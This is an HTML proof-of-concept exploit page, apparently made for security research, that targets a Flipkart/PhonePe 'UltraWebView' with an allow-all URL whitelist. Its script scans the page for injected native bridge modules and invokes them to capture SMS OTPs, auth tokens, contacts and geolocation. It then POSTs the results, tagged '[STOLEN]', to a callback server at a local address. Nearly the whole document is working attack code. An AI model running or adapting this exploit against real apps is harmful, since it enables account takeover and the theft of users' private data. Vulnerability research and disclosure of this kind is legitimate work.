<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>FK1 UltraWebView Bridge PoC</title>
  <style>
    body { font-family: monospace; font-size: 13px; background: #111; color: #eee; padding: 12px; margin: 0; }
    h2 { color: #ff9800; margin: 0 0 8px; font-size: 15px; }
    .found { color: #4caf50; font-weight: bold; }
    .missing { color: #f44336; }
    .info { color: #90caf9; }
    .warn { color: #ffeb3b; }
    #log { margin-top: 10px; white-space: pre-wrap; word-break: break-all; }
    .box { border: 1px solid #444; padding: 8px; margin: 6px 0; border-radius: 4px; }
  </style>
</head>
<body>
<h2>FK1 — UltraWebView AllowAllUrlWhiteList PoC</h2>
<div class="box info">Loading in Flipkart UltraWebView context...<br/>clientId=phonepe | AllowAllUrlWhiteList active</div>
<div id="log"></div>

<script>
// Callback server (PoC app local HTTP server)
var CB = 'http://127.0.0.1:18766';

var logEl = document.getElementById('log');
function log(msg, cls) {
  var line = document.createElement('div');
  if (cls) line.className = cls;
  line.textContent = msg;
  logEl.appendChild(line);
  console.log(msg);
  // fire-and-forget callback to PoC server
  try { fetch(CB + '/log?' + encodeURIComponent(msg)).catch(function(){}); } catch(e) {}
}

function reportBridge(name, detail) {
  var msg = '[BRIDGE FOUND] ' + name + (detail ? ': ' + detail : '');
  var line = document.createElement('div');
  line.className = 'found';
  line.textContent = msg;
  logEl.appendChild(line);
  console.warn(msg);
  try { fetch(CB + '/bridge?' + encodeURIComponent(msg)).catch(function(){}); } catch(e) {}
}

function reportData(label, data) {
  var payload = JSON.stringify({label: label, data: data});
  var line = document.createElement('div');
  line.className = 'warn';
  line.textContent = '[STOLEN] ' + label + ': ' + payload.substring(0, 200);
  logEl.appendChild(line);
  console.warn('[STOLEN]', payload);
  try {
    fetch(CB + '/stolen', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: payload
    }).catch(function(){});
  } catch(e) {}
}

// ── 1. Known Flipkart / PhonePe bridge module names ──────────────────────────
var KNOWN_BRIDGES = [
  // SMS / OTP
  'JSSMSModule',
  // Auth
  'JSAuthModule',
  // Contacts
  'JSContactsModule',
  // Geolocation
  'RNCGeolocationModule',
  // PhonePe Ultra
  'PhonePeUltraBridgeModule',
  // Flipkart Ultra generic
  'FKUltraBridgeModule',
  'UltraBridgeModule',
  // Device / analytics
  'JSDeviceInfoModule',
  'JSAnalyticsModule',
  'JSNetworkModule',
  'JSStorageModule',
  'JSCameraModule',
  'JSFileModule',
  // React Native bridges that may be exposed
  'RNDeviceInfo',
  'RNFetchBlob',
  'RNCamera',
  'Keyboard',
];

log('--- Scanning known bridge names ---', 'info');
var foundCount = 0;
KNOWN_BRIDGES.forEach(function(name) {
  if (typeof window[name] !== 'undefined') {
    foundCount++;
    var methods = [];
    try {
      var obj = window[name];
      // list methods
      var proto = Object.getPrototypeOf(obj);
      var keys = [];
      try { keys = keys.concat(Object.getOwnPropertyNames(obj)); } catch(e) {}
      try { if (proto) keys = keys.concat(Object.getOwnPropertyNames(proto)); } catch(e) {}
      methods = keys.filter(function(k) {
        try { return typeof obj[k] === 'function' && k !== 'constructor'; } catch(e) { return false; }
      });
    } catch(e) {}
    reportBridge(name, 'methods=[' + methods.join(',') + ']');
  } else {
    log('  MISSING: ' + name, 'missing');
  }
});

// ── 2. Broad scan — find ANY property that looks like an injected bridge ──────
log('--- Broad window scan ---', 'info');
var allKeys = [];
try { allKeys = Object.getOwnPropertyNames(window); } catch(e) {}

var BRIDGE_KEYWORDS = ['module', 'bridge', 'flipkart', 'phonepe', 'fk', 'ultra', 'jssms', 'jsauth', 'jscontact'];
allKeys.forEach(function(key) {
  var lk = key.toLowerCase();
  var isSuspect = BRIDGE_KEYWORDS.some(function(kw) { return lk.indexOf(kw) !== -1; });
  if (!isSuspect) return;
  // skip known browser globals
  if (['location','history','performance','localStorage','sessionStorage',
       'localStorage','navigator','document','screen','console'].indexOf(key) !== -1) return;
  try {
    var val = window[key];
    if (val && typeof val === 'object') {
      var methods = [];
      try { methods = Object.getOwnPropertyNames(val).filter(function(k) {
        try { return typeof val[k] === 'function'; } catch(e) { return false; }
      }); } catch(e) {}
      if (methods.length > 0) {
        reportBridge('SCAN:' + key, 'methods=[' + methods.join(',') + ']');
      }
    }
  } catch(e) {}
});

// ── 3. Try invoking known dangerous methods ───────────────────────────────────
log('--- Invoking bridge methods ---', 'info');

// JSSMSModule.captureOtpMessage() — arms SMS Retriever API to auto-read next OTP
try {
  if (typeof window.JSSMSModule !== 'undefined' && typeof window.JSSMSModule.captureOtpMessage === 'function') {
    var result = window.JSSMSModule.captureOtpMessage('\\d{6}');
    reportData('JSSMSModule.captureOtpMessage', result);
  }
} catch(e) { log('JSSMSModule.captureOtpMessage error: ' + e, 'warn'); }

// JSAuthModule.init() or getToken()
try {
  if (typeof window.JSAuthModule !== 'undefined') {
    if (typeof window.JSAuthModule.getToken === 'function') {
      var tok = window.JSAuthModule.getToken();
      reportData('JSAuthModule.getToken', tok);
    } else if (typeof window.JSAuthModule.init === 'function') {
      var r2 = window.JSAuthModule.init('{}');
      reportData('JSAuthModule.init', r2);
    }
  }
} catch(e) { log('JSAuthModule error: ' + e, 'warn'); }

// JSContactsModule
try {
  if (typeof window.JSContactsModule !== 'undefined' && typeof window.JSContactsModule.getContacts === 'function') {
    window.JSContactsModule.getContacts(function(contacts) {
      reportData('JSContactsModule.getContacts', contacts);
    });
  }
} catch(e) { log('JSContactsModule error: ' + e, 'warn'); }

// RNCGeolocationModule
try {
  if (typeof window.RNCGeolocationModule !== 'undefined' && typeof window.RNCGeolocationModule.getCurrentPosition === 'function') {
    window.RNCGeolocationModule.getCurrentPosition(function(pos) {
      reportData('RNCGeolocationModule.position', pos);
    }, function(){}, {});
  }
} catch(e) { log('RNCGeolocationModule error: ' + e, 'warn'); }

// PhonePeUltraBridgeModule
try {
  if (typeof window.PhonePeUltraBridgeModule !== 'undefined') {
    var ppMethods = Object.getOwnPropertyNames(window.PhonePeUltraBridgeModule).filter(function(k) {
      try { return typeof window.PhonePeUltraBridgeModule[k] === 'function'; } catch(e) { return false; }
    });
    reportData('PhonePeUltraBridgeModule.methods', ppMethods);
  }
} catch(e) { log('PhonePeUltraBridgeModule error: ' + e, 'warn'); }

// ── 4. Summary ────────────────────────────────────────────────────────────────
var summary = 'TOTAL BRIDGES FOUND: ' + foundCount + ' / ' + KNOWN_BRIDGES.length;
log(summary, foundCount > 0 ? 'found' : 'missing');
try { fetch(CB + '/bridge?' + encodeURIComponent('SUMMARY: ' + summary)).catch(function(){}); } catch(e) {}
</script>
</body>
</html>
